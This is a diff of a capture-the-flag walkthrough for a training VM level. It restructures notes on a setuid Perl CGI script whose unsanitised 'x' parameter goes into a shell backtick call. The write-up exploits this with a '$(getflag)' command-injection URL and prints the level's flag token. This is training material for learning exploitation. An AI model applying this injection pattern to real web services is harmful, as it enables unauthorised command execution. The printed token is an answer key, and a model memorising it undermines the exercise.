@@ -1,60 +1,94 @@
 # level04
 
-The first thing we see is we have a Perl script.
-```
-ls -l
--rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
-```
-Just like the previous level, we see that the Set User ID and the Set Group ID are set
-(allowing us `level04` to run the file like the owner of it `flag04`).
+## Steps
 
-When running it, nothing much happens.
-```
-./level04.pl 
-Content-type: text/html
+1. __Observation__ (Guest): when connecting as the `level04` user,
+    nothing appears on stdout.
+
+2. __Action__ (Guest): list the files present at the root
+    ```sh
+    ls -lA
+    ```
+
+3. __Observation__ (Guest): the previous command reveals a Perl script
+    ```sh
+    -rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
+    ```
+    Just like the previous level, we see that the Set User ID 
+    and the Set Group ID are set (allowing us `level04` to run the file 
+    like its' owner `flag04`).
+
+4. __Action__ (Guest): run the script
+    ```sh
+    ./level04.pl
+    ```
+
+5. __Observation__ (Guest): nothing much happens, some text is displayed
+    on stdout
+    ```sh
+    Content-type: text/html
 
 
-```
+    ```
 
-We may get a few infos by using `cat`.
-```perl
-cat level04.pl
-#!/usr/bin/perl
-# localhost:4747
-use CGI qw{param};
-print "Content-type: text/html\n\n";
-sub x {
-  $y = $_[0];
-  print `echo $y 2>&1`;
-}
-x(param("x"));
-```
+6. __Action__ (Guest): check the content of the file
+    ```sh
+    cat level04.pl
+    ```
 
-There are a few things to understand about this Perl script.
-```perl
-# localhost:4747 # This is how the webserver needs to be run
-use CGI qw(param) # the param is imported from the CGI module
-print "Content-type: text/html\n\n"; # Informs the web server that the content being sent back to the browser is HTML
-sub x {
-  $y = $_[0];
-  print `echo $y 2>&1`;
-} # This is a subroutine, it takes the first argument passed and prints it
-x(param("x")) # The parameter passed is stored in the variable `x`
-```
-Since we port forwarded differently, the server will be run using an IP address. 
+7. __Observation__ (Guest): the previous command reveals the content 
+    of the file
+    ```perl
+    #!/usr/bin/perl
+    # localhost:4747
+    use CGI qw{param};
+    print "Content-type: text/html\n\n";
+    sub x {
+        $y = $_[0];
+        print `echo $y 2>&1`;
+    }
+    x(param("x"));
+    ```
+    - The server is ran on localhost on the port 4747
+    - The param is imported from the CGI module
+    - The web server is informed the content sent back to the browser is HTML
+    - There's a subroutine that takes the first argument given and prints it
+    - The parameter passed is stored in a variable named `x`
 
-In a web browser we run it like this : `192.168.56.101:4747`.
-At first nothing happens. We then add the script to the address `192.168.56.101:4747/level04.pl` and still nothing happens.
-We know we can pass an argument if it's stored in the variable `x` so that's what we'll do.
+8. __Action__ (Host): run the web server
+    Since we port-forwarded differently, the web server will be run using the
+    IP address of our VM. We open our web brower and enter this
+    ```sh
+    192.168.56.101:4747
+    ```
 
-`192.168.56.101:4747/level04.pl?x=test` displays test on the screen.
-We now need to find what to pass to get the flag. We assume it has something to do with the `getflag` command
+9. __Observation__ (Host): a blank page is showed
 
-`192.168.56.101:4747/level04.pl?x=getflag` displays getflag on the screen
+10. __Action__ (Host): link the Perl script. we now run the web server
+    like this
+    ```sh
+    192.168.56.101:4747/level04.pl
+    ```
 
-In bash, we know that a command can be substituted using `command` or `$(command)`. Since using `command` doesn't work, we're trying using `$(command)`
+11. __Observation__ (Host): the same blank page is showed
 
-`192.168.56.101:4747/level04.pl?x=(getflag)` does give us the flag
-```
-Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
-```
+12. __Action__ (Host): since the subroutine in `level04.pl` accepts a `x`
+    variable, we try passing a value to `x` to see what happens.
+    The web server is now run like this
+    ```sh
+    192.168.56.101:4747?x=test
+    ```
+
+13. __Observation__ (Host): test is displayed on the screen
+
+14. __Action__ (Host): invoke the `getflag` command.
+    we know that commands are substituted like this in bash `$(command)`
+    so this is how we'll run the server
+    ```sh
+    192.168.56.101:4747?x=$(getflag)
+    ```
+
+15. __Observation__ (Host): the following sentence is displayed on the screen
+    ```sh
+    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+    ```
